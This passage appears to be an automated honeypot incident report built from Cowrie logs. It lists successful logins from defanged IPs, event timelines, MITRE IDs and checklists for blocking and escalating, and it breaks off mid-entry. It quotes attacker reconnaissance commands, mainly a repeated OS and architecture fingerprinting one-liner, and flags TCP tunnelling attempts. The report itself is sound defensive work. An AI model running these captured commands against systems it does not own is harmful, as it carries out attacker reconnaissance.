| `2026-07-08 03:00:37` | `cowrie.login.success` |
| `2026-07-08 03:00:37` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:00:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.219.196[.]17` to AbuseIPDB if not already reported
- [ ] Block `91.219.196[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a04b1a23a90

| Field | Detail |
|---|---|
| **Source IP** | `183.215.27[.]197` |
| **First Seen** | 2026-07-08 03:00 |
| **Last Seen** | 2026-07-08 03:05 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:00:48` | `cowrie.session.connect` |
| `2026-07-08 03:00:48` | `cowrie.client.version` |
| `2026-07-08 03:00:48` | `cowrie.client.kex` |
| `2026-07-08 03:00:49` | `cowrie.login.success` |
| `2026-07-08 03:00:50` | `cowrie.session.params` |
| `2026-07-08 03:00:50` | `cowrie.command.input` |
| `2026-07-08 03:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.215.27[.]197` to AbuseIPDB if not already reported
- [ ] Block `183.215.27[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b4c2af9588

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 03:01 |
| **Last Seen** | 2026-07-08 03:01 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:01:08` | `cowrie.session.connect` |
| `2026-07-08 03:01:09` | `cowrie.client.version` |
| `2026-07-08 03:01:09` | `cowrie.client.kex` |
| `2026-07-08 03:01:16` | `cowrie.login.success` |
| `2026-07-08 03:01:19` | `cowrie.session.params` |
| `2026-07-08 03:01:19` | `cowrie.command.input` |
| `2026-07-08 03:01:20` | `cowrie.log.closed` |
| `2026-07-08 03:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123603dcfa7d

| Field | Detail |
|---|---|
| **Source IP** | `47.85.8[.]171` |
| **First Seen** | 2026-07-08 03:01 |
| **Last Seen** | 2026-07-08 03:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:01:37` | `cowrie.session.connect` |
| `2026-07-08 03:01:37` | `cowrie.telnet.option` |
| `2026-07-08 03:01:37` | `cowrie.telnet.option` |
| `2026-07-08 03:02:37` | `cowrie.login.success` |
| `2026-07-08 03:02:37` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.85.8[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.8[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60b94c46332

| Field | Detail |
|---|---|
| **Source IP** | `34.156.93[.]245` |
| **First Seen** | 2026-07-08 03:02 |
| **Last Seen** | 2026-07-08 03:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:02:22` | `cowrie.session.connect` |
| `2026-07-08 03:02:22` | `cowrie.login.success` |
| `2026-07-08 03:02:23` | `cowrie.session.params` |
| `2026-07-08 03:02:23` | `cowrie.command.input` |
| `2026-07-08 03:02:23` | `cowrie.command.input` |
| `2026-07-08 03:02:23` | `cowrie.command.failed` |
| `2026-07-08 03:02:23` | `cowrie.command.input` |
| `2026-07-08 03:02:23` | `cowrie.log.closed` |
| `2026-07-08 03:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.93[.]245` to AbuseIPDB if not already reported
- [ ] Block `34.156.93[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f8b60692c06

| Field | Detail |
|---|---|
| **Source IP** | `34.156.93[.]245` |
| **First Seen** | 2026-07-08 03:02 |
| **Last Seen** | 2026-07-08 03:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:02:31` | `cowrie.session.connect` |
| `2026-07-08 03:02:31` | `cowrie.login.success` |
| `2026-07-08 03:02:31` | `cowrie.session.params` |
| `2026-07-08 03:02:31` | `cowrie.command.input` |
| `2026-07-08 03:02:31` | `cowrie.command.failed` |
| `2026-07-08 03:02:36` | `cowrie.log.closed` |
| `2026-07-08 03:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.93[.]245` to AbuseIPDB if not already reported
- [ ] Block `34.156.93[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237ae081909b

| Field | Detail |
|---|---|
| **Source IP** | `34.156.93[.]245` |
| **First Seen** | 2026-07-08 03:02 |
| **Last Seen** | 2026-07-08 03:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:02:33` | `cowrie.session.connect` |
| `2026-07-08 03:02:33` | `cowrie.login.success` |
| `2026-07-08 03:02:33` | `cowrie.session.params` |
| `2026-07-08 03:02:33` | `cowrie.command.input` |
| `2026-07-08 03:02:36` | `cowrie.log.closed` |
| `2026-07-08 03:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.93[.]245` to AbuseIPDB if not already reported
- [ ] Block `34.156.93[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9faa7877f27b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:06 |
| **Last Seen** | 2026-07-08 03:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:06:10` | `cowrie.session.connect` |
| `2026-07-08 03:06:11` | `cowrie.client.version` |
| `2026-07-08 03:06:11` | `cowrie.client.kex` |
| `2026-07-08 03:06:13` | `cowrie.login.success` |
| `2026-07-08 03:06:16` | `cowrie.session.params` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.success` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.command.input` |
| `2026-07-08 03:06:16` | `cowrie.log.closed` |
| `2026-07-08 03:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abb96f5986c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:08 |
| **Last Seen** | 2026-07-08 03:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:08:05` | `cowrie.session.connect` |
| `2026-07-08 03:08:06` | `cowrie.client.version` |
| `2026-07-08 03:08:06` | `cowrie.client.kex` |
| `2026-07-08 03:08:08` | `cowrie.login.success` |
| `2026-07-08 03:08:09` | `cowrie.session.params` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.success` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:09` | `cowrie.command.input` |
| `2026-07-08 03:08:10` | `cowrie.log.closed` |
| `2026-07-08 03:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20e49d6f6b43

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 03:09 |
| **Last Seen** | 2026-07-08 03:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:09:34` | `cowrie.session.connect` |
| `2026-07-08 03:09:34` | `cowrie.client.version` |
| `2026-07-08 03:09:34` | `cowrie.client.kex` |
| `2026-07-08 03:09:34` | `cowrie.login.success` |
| `2026-07-08 03:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3df0fcb2ae

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 03:09 |
| **Last Seen** | 2026-07-08 03:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:09:34` | `cowrie.session.connect` |
| `2026-07-08 03:09:34` | `cowrie.client.version` |
| `2026-07-08 03:09:34` | `cowrie.client.kex` |
| `2026-07-08 03:09:34` | `cowrie.login.success` |
| `2026-07-08 03:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2fc9d80c3f1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 03:09 |
| **Last Seen** | 2026-07-08 03:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:09:41` | `cowrie.session.connect` |
| `2026-07-08 03:09:41` | `cowrie.client.version` |
| `2026-07-08 03:09:41` | `cowrie.client.kex` |
| `2026-07-08 03:09:41` | `cowrie.login.success` |
| `2026-07-08 03:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af3ecaae6a6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:10 |
| **Last Seen** | 2026-07-08 03:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:10:02` | `cowrie.session.connect` |
| `2026-07-08 03:10:02` | `cowrie.client.version` |
| `2026-07-08 03:10:02` | `cowrie.client.kex` |
| `2026-07-08 03:10:04` | `cowrie.login.success` |
| `2026-07-08 03:10:06` | `cowrie.session.params` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.success` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.command.input` |
| `2026-07-08 03:10:06` | `cowrie.log.closed` |
| `2026-07-08 03:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a541c2a422

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:12 |
| **Last Seen** | 2026-07-08 03:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:12:01` | `cowrie.session.connect` |
| `2026-07-08 03:12:01` | `cowrie.client.version` |
| `2026-07-08 03:12:01` | `cowrie.client.kex` |
| `2026-07-08 03:12:03` | `cowrie.login.success` |
| `2026-07-08 03:12:05` | `cowrie.session.params` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.success` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.command.input` |
| `2026-07-08 03:12:05` | `cowrie.log.closed` |
| `2026-07-08 03:12:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-076c60084031

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:14 |
| **Last Seen** | 2026-07-08 03:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:14:01` | `cowrie.session.connect` |
| `2026-07-08 03:14:01` | `cowrie.client.version` |
| `2026-07-08 03:14:01` | `cowrie.client.kex` |
| `2026-07-08 03:14:03` | `cowrie.login.success` |
| `2026-07-08 03:14:04` | `cowrie.session.params` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.success` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:04` | `cowrie.command.input` |
| `2026-07-08 03:14:05` | `cowrie.log.closed` |
| `2026-07-08 03:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5becb8ad28f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:16 |
| **Last Seen** | 2026-07-08 03:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:16:04` | `cowrie.session.connect` |
| `2026-07-08 03:16:04` | `cowrie.client.version` |
| `2026-07-08 03:16:04` | `cowrie.client.kex` |
| `2026-07-08 03:16:06` | `cowrie.login.success` |
| `2026-07-08 03:16:07` | `cowrie.session.params` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.success` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:07` | `cowrie.command.input` |
| `2026-07-08 03:16:08` | `cowrie.log.closed` |
| `2026-07-08 03:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dda84435322

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:20 |
| **Last Seen** | 2026-07-08 03:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:20:08` | `cowrie.session.connect` |
| `2026-07-08 03:20:08` | `cowrie.client.version` |
| `2026-07-08 03:20:08` | `cowrie.client.kex` |
| `2026-07-08 03:20:10` | `cowrie.login.success` |
| `2026-07-08 03:20:11` | `cowrie.session.params` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.success` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:11` | `cowrie.command.input` |
| `2026-07-08 03:20:12` | `cowrie.log.closed` |
| `2026-07-08 03:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7df1b6aa18

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-07-08 03:20 |
| **Last Seen** | 2026-07-08 03:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:20:56` | `cowrie.session.connect` |
| `2026-07-08 03:20:56` | `cowrie.client.version` |
| `2026-07-08 03:20:56` | `cowrie.client.kex` |
| `2026-07-08 03:20:58` | `cowrie.login.success` |
| `2026-07-08 03:20:59` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b023e1bcc96

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-07-08 03:21 |
| **Last Seen** | 2026-07-08 03:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:21:14` | `cowrie.session.connect` |
| `2026-07-08 03:21:15` | `cowrie.client.version` |
| `2026-07-08 03:21:15` | `cowrie.client.kex` |
| `2026-07-08 03:21:17` | `cowrie.login.success` |
| `2026-07-08 03:21:18` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb54929ec20d

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-07-08 03:21 |
| **Last Seen** | 2026-07-08 03:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
